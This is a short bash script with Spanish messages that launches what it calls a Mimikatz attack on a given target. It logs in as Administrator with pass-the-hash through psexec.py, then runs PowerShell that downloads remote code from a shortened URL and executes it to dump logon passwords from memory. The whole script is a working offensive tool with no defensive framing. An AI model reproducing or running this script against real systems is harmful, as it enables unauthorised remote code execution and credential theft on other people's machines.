#!/bin/bash

if [ -z "$1" ]; then
    echo "Uso: $0 <target>"
    exit 1
fi

TARGET=$1

echo "Iniciando ataque Mimikatz en $TARGET"
psexec.py Administrator@$TARGET -hashes :aad3b435b51404eeaad3b435b51404ee 'powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/mimikatz'); Invoke-Mimikatz -Command '"'"'privilege::debug sekurlsa::logonpasswords'"'"'"'

echo "Ataque Mimikatz completado."
